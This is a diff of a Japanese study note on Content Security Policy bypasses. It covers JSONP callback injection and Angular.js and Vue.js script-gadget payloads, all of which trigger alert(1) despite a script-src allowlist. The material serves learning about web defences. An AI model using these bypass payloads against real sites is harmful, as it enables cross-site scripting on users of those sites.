@@ -1,3 +1,5 @@
+# CSP Evaluator
+
 ## CSPとは
 CSP(Content Security Policy)
 
@@ -79,12 +81,12 @@ Content-Security-Policy: script-src 'self' csp.example.com
 
 Attacker -> Target
 ```html
-<script src="http://csp.example.com/jsonp?callback=alert(1)//"></script>
+<script src="csp.example.com/jsonp?callback=alert(1)//"></script>
 ```
 
 Target -> csp.example.com
 ```text
-http://csp.example.com/jsonp?callback=alert(1)//
+csp.example.com/jsonp?callback=alert(1)//
 #通常 callback 関数を要求していますが、今回はalertが渡されている
 ```
 
@@ -97,9 +99,18 @@ alert(1)//({name:aaaa})
 
 **サーバのライブラリ**
 
-```
+ライブラリに含まれる Script Gadget と呼ばれるスクリプトの挿入を可能にするスクリプトを利用する。
+
+Angular.js の場合
+```html
 <script src="csp.example.com/angular.js"></script>
-<ぢvんg-あっpんｇ－ｃｓｐ＞｛
+<div ng-app ng-csp>{{ eval.constructor('alert(1)')() }}</div>
+```
+
+Vue.js の場合
+```html
+<script src="cdn.example.com/vue.js"></script>
+<div>{{ constructor.constructor('alert(1)')() }}</div>
 ```
 
 
